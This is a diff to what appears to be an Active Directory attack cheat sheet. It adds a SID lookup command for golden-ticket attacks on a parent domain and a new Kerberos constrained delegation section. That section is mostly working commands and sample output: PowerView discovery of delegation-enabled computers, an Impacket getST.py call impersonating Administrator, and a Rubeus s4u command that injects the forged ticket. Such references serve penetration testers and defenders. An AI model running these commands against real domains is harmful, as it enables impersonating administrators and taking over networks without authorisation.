@@ -49,6 +49,7 @@
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
+    - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
@@ -1089,6 +1090,9 @@ Prerequisite:
     ```powershell
     $ Convert-NameToSid target.domain.com\krbtgt
     S-1-5-21-2941561648-383941485-1389968811-502
+
+    # with Impacket
+    lookupsid.py domain/user:password@10.10.10.10
     ```
 - Replace 502 with 519 to represent Enterprise Admins
 - Create golden ticket and attack parent domain. 
@@ -1098,7 +1102,7 @@ Prerequisite:
 
 ### Kerberos Unconstrained Delegation
 
-> The user sends a TGS to access the service, along with their TGT, and then the service can use the user’s TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+> The user sends a TGS to access the service, along with their TGT, and then the service can use the user's TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
 
 Domain Compromise via DC Print Server and Unconstrained Delegation
 
@@ -1162,6 +1166,34 @@ Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HA
 
 * Ensure sensitive accounts cannot be delegated
 * Disable the Print Spooler Service
+
+### Kerberos Constrained Delegation
+
+> Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,
+
+Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username).
+
+```powershell
+# Discover
+$ Get-DomainComputer -TrustedToAuth | select -exp dnshostname
+
+# Find the service 
+$ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
+
+# Exploit with Impacket
+$ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+# Exploit with Rubeus
+$ rubeus s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
+```
+
 
 ### Kerberos Resource Based Constrained Delegation
 
